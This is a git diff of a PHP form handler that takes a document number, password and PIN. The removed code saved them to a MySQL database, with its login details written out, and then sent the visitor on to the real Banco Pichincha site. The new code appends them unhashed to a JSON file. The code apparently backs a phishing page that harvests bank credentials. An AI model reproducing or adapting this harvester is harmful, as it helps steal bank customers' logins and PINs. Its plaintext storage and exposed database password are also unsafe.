@@ -1,17 +1,6 @@
 <?php
-// Datos de conexión a la base de datos en InfinityFree
-$host = "sql205.infinityfree.com";  // Nombre del host MySQL
-$user = "if0_38555962";             // Usuario de MySQL
-$password = "d4rNqnAfb4z";          // Contraseña de MySQL
-$dbname = "if0_38555962_zowers";    // Nombre de la base de datos
-
-// Conectar a la base de datos
-$conn = new mysqli($host, $user, $password, $dbname);
-
-// Verificar conexión
-if ($conn->connect_error) {
-    die("Error de conexión: " . $conn->connect_error);
-}
+// Ruta del archivo JSON donde se guardarán los datos
+$jsonFile = "usuarios.json";
 
 // Verificar si la solicitud es POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
@@ -20,30 +9,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST["password"];
     $pin = $_POST["pin"];
 
-    // Prevenir SQL Injection
-    $documento = $conn->real_escape_string($documento);
-    $password = $conn->real_escape_string($password);
-    $pin = $conn->real_escape_string($pin);
+    // Crear un nuevo usuario
+    $nuevoUsuario = [
+        "documento" => $documento,
+        "password" => $password,
+        "pin" => $pin,
+        "fecha_registro" => date("Y-m-d H:i:s") // Guardar fecha y hora de registro
+    ];
 
-    // Verificar si el usuario ya existe
-    $sql_check = "SELECT * FROM usuarios WHERE documento = '$documento'";
-    $result_check = $conn->query($sql_check);
-
-    if ($result_check->num_rows == 0) {
-        // Si el usuario no existe, insertarlo en la base de datos
-        $sql_insert = "INSERT INTO usuarios (documento, password, pin) VALUES ('$documento', '$password', '$pin')";
-        if ($conn->query($sql_insert) === TRUE) {
-            // Redirigir a la página deseada
-            header("Location: https://www.pichincha.com");
-            exit();
-        } else {
-            echo "Error al guardar los datos: " . $conn->error;
-        }
+    // Leer los datos actuales del archivo JSON
+    if (file_exists($jsonFile)) {
+        $usuarios = json_decode(file_get_contents($jsonFile), true);
     } else {
-        echo "El usuario ya existe en la base de datos.";
+        $usuarios = [];
     }
-}
 
-// Cerrar conexión
-$conn->close();
+    // Agregar el nuevo usuario al array de usuarios
+    $usuarios[] = $nuevoUsuario;
+
+    // Guardar los datos en el archivo JSON
+    file_put_contents($jsonFile, json_encode($usuarios, JSON_PRETTY_PRINT));
+
+    // Redirigir a la página de bienvenida
+    header("Location: bienvenido.html");
+    exit();
+}
 ?>
